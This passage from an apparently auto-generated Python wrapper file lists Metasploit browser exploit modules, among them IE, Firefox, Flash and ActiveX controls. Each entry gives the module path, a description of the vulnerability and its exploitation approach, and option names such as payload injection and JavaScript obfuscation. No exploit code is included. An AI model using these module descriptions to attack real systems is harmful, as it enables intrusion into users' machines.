			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			UNCPATH = 'UNCPATH'

	class windows_browser_wmi_admintools(object):
		"""
		
          This module exploits a memory trust issue in the Microsoft WMI
        Administration tools ActiveX control. When processing a specially crafted
        HTML page, the WEBSingleView.ocx ActiveX Control (1.50.1131.0) will treat
        the 'lCtxHandle' parameter to the 'AddContextRef' and 'ReleaseContext' methods
        as a trusted pointer. It makes an indirect call via this pointer which leads
        to arbitrary code execution.

        This exploit utilizes a combination of heap spraying and the
        .NET 2.0 'mscorie.dll' module to bypass DEP and ASLR. This module does not
        opt-in to ASLR. As such, this module should be reliable on all Windows
        versions.

        The WMI Adminsitrative Tools are a standalone download & install (linked in the
        references).

      
		"""

		path = 'windows/browser/wmi_admintools'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_adobe_jbig2decode(object):
		"""
		
          This module exploits a heap-based pointer corruption flaw in Adobe Reader 9.0.0 and earlier.
        This module relies upon javascript for the heap spray.
      
		"""

		path = 'windows/browser/adobe_jbig2decode'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_apple_itunes_playlist(object):
		"""
		
          This module exploits a stack buffer overflow in Apple ITunes 4.7
        build 4.7.0.42. By creating a URL link to a malicious PLS
        file, a remote attacker could overflow a buffer and execute
        arbitrary code. When using this module, be sure to set the
        URIPATH with an extension of '.pls'.
      
		"""

		path = 'windows/browser/apple_itunes_playlist'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_hyleos_chemviewx_activex(object):
		"""
		
          This module exploits a stack-based buffer overflow within version 1.9.5.1 of Hyleos
        ChemView (HyleosChemView.ocx). By calling the 'SaveAsMolFile' or 'ReadMolFile' methods
        with an overly long first argument, an attacker can overrun a buffer and execute
        arbitrary code.
      
		"""

		path = 'windows/browser/hyleos_chemviewx_activex'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_nis2004_antispam(object):
		"""
		
          This module exploits a stack buffer overflow in Norton AntiSpam 2004. When
        sending an overly long string to the LaunchCustomRuleWizard() method
        of symspam.dll (2004.1.0.147) an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/nis2004_antispam'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_hp_easy_printer_care_xmlcachemgr(object):
		"""
		
          This module allows remote attackers to place arbitrary files on a users file
        system by abusing the "CacheDocumentXMLWithId" method from the "XMLCacheMgr"
        class in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll
        2.7.2.0).

          Code execution can be achieved by first uploading the payload to the remote
        machine embeddeding a vbs file, and then upload another mof file, which enables
        Windows Management Instrumentation service to execute the vbs. Please note that
        this module currently only works for Windows before Vista.
      
		"""

		path = 'windows/browser/hp_easy_printer_care_xmlcachemgr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_juniper_sslvpn_ive_setupdll(object):
		"""
		
        This module exploits a stack buffer overflow in the JuniperSetupDLL.dll
        library which is called by the JuniperSetup.ocx ActiveX	control,
        as part of the Juniper SSL-VPN (IVE) appliance. By specifying an
        overly long string to the ProductName object parameter, the stack
        is overwritten.
      
		"""

		path = 'windows/browser/juniper_sslvpn_ive_setupdll'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_java_ws_vmargs(object):
		"""
		
          This module exploits a flaw in the Web Start component of the Sun Java
        Runtime Environment. The arguments passed to Java Web Start are not properly
        validated, allowing injection of arbitrary arguments to the JVM.

        By utilizing the lesser known -J option, an attacker can take advantage of
        the -XXaltjvm option, as discussed previously by Ruben Santamarta. This method
        allows an attacker to execute arbitrary code in the context of an unsuspecting
        browser user.

        In order for this module to work, it must be ran as root on a server that
        does not serve SMB. Additionally, the target host must have the WebClient
        service (WebDAV Mini-Redirector) enabled.
      
		"""

		path = 'windows/browser/java_ws_vmargs'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			UNCPATH = 'UNCPATH'

	class windows_browser_c6_messenger_downloaderactivex(object):
		"""
		
          This module exploits a vulnerability in Icona SpA C6 Messenger 1.0.0.1. The
        vulnerability is in the DownloaderActiveX Control (DownloaderActiveX.ocx). The
        insecure control can be abused to download and execute arbitrary files in the context of
        the currently logged-on user.
      
		"""

		path = 'windows/browser/c6_messenger_downloaderactivex'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_realplayer_import(object):
		"""
		
          This module exploits a stack buffer overflow in RealOne Player V2 Gold Build 6.0.11.853 and
        RealPlayer 10.5 Build 6.0.12.1483. By sending an overly long string to the "Import()"
        method, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/realplayer_import'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_ms14_012_textrange(object):
		"""
		
        This module exploits a use-after-free vulnerability found in Internet Explorer. The flaw
        was most likely introduced in 2013, therefore only certain builds of MSHTML are
        affected. In our testing with IE9, these vulnerable builds appear to be between
        9.0.8112.16496 and 9.0.8112.16533, which implies the vulnerability shipped between
        August 2013, when it was introduced, until the fix issued in early March 2014.
      
		"""

		path = 'windows/browser/ms14_012_textrange'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_mozilla_attribchildremoved(object):
		"""
		
        This module exploits a use-after-free vulnerability in Firefox 8/8.0.1 and 9/9.0.1.
        Removal of child nodes from the nsDOMAttribute can allow for a child
        to still be accessible after removal due to a premature notification
        of AttributeChildRemoved. Since mFirstChild is not set to NULL until
        after this call is made, this means the removed child will be accessible
        after it has been removed. By carefully manipulating the memory layout,
        this can lead to arbitrary code execution.
      
		"""

		path = 'windows/browser/mozilla_attribchildremoved'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms13_059_cflatmarkuppointer(object):
		"""
		
        This is a memory corruption bug found in Microsoft Internet Explorer. On IE 9,
        it seems to only affect certain releases of mshtml.dll, ranging from a newly
        installed IE9 (9.0.8112.16446), to 9.00.8112.16502 (July 2013 update). IE8
        requires a different way to trigger the vulnerability, but not currently covered
        by this module.

        The issue is specific to the browser's IE7 document compatibility, which can be
        defined in X-UA-Compatible, and the content editable mode must be enabled. An
        "onmove" event handler is also necessary to be able to trigger the bug, and the
        event will be run twice before the crash. The first time is due to the position
        change of the body element, which is also when a MSHTML!CFlatMarkupPointer::`vftable'
        object is created during a "SelectAll" command, and this object will be used later
        on for the crash. The second onmove event seems to be triggered by a InsertButton
        (or Insert-whatever) command, which is also responsible for the free of object
        CFlatMarkupPointer during page rendering. The EnsureRecalcNotify() function will
        then still return an invalid reference to CFlatMarkupPointer (stored in EBX), and
        then passes this on to the next functions (GetLineInfo -> QIClassID).  When this
        reference arrives in function QIClassID, an access violation finally occurs when
        the function is trying to call QueryInterface() with the bad reference, and this
        results a crash. Successful control of the freed memory may leverage arbitrary code
        execution under the context of the user.

        Note: It is also possible to see a different object being freed and used, doesn't
        always have to be CFlatMarkupPointer.
      
		"""

		path = 'windows/browser/ms13_059_cflatmarkuppointer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_adobe_flash_copy_pixels_to_byte_array(object):
		"""
		
        This module exploits an integer overflow in Adobe Flash Player. The vulnerability occurs
        in the copyPixelsToByteArray method from the BitmapData object. The position field of the
        destination ByteArray can be used to cause an integer overflow and write contents out of
        the ByteArray buffer. This module has been tested successfully on:
        * Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 14.0.0.176, 14.0.0.145, and 14.0.0.125.
        * Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 14.0.0.179.
        * Windows 8.1, Firefox 38.0.5 and Adobe Flash 14.0.0.179.
      
		"""

		path = 'windows/browser/adobe_flash_copy_pixels_to_byte_array'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_persits_xupload_traversal(object):
		"""
		
          This module exploits a directory traversal in Persits Software Inc's
        XUpload ActiveX control(version 3.0.0.3) that's included in HP LoadRunner 9.5.
        By passing a string containing "../" sequences to the MakeHttpRequest method,
        an attacker is able to write arbitrary files to arbitrary locations on disk.

        Code execution occurs by writing to the All Users Startup Programs directory.
        You may want to combine this module with the use of exploit/multi/handler since a
        user would have to log for the payload to execute.
      
		"""

		path = 'windows/browser/persits_xupload_traversal'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'

	class windows_browser_symantec_consoleutilities_browseandsavefile(object):
		"""
		
          This module exploits a stack buffer overflow in Symantecs ConsoleUtilities.
        By sending an overly long string to the "BrowseAndSaveFile()" method located
        in the AeXNSConsoleUtilities.dll (6.0.0.1846) Control, an attacker may be able to
        execute arbitrary code
      
		"""

		path = 'windows/browser/symantec_consoleutilities_browseandsavefile'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_novelliprint_getdriversettings(object):
		"""
		
          This module exploits a stack buffer overflow in Novell iPrint Client 4.34. When
        sending an overly long string to the GetDriverSettings() property of ienipp.ocx
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/browser/novelliprint_getdriversettings'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_winzip_fileview(object):
		"""
		
          The FileView ActiveX control (WZFILEVIEW.FileViewCtrl.61) could allow a
        remote attacker to execute arbitrary code on the system. The control contains
        several unsafe methods and is marked safe for scripting and safe for initialization.
        A remote attacker could exploit this vulnerability to execute arbitrary code on the
        victim system. WinZip 10.0 <= Build 6667 are vulnerable.
      
		"""

		path = 'windows/browser/winzip_fileview'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_firefox_smil_uaf(object):
		"""
		
          This module exploits an out-of-bounds indexing/use-after-free condition present in
          nsSMILTimeContainer::NotifyTimeChange() across numerous versions of Mozilla Firefox
          on Microsoft Windows.
          
		"""

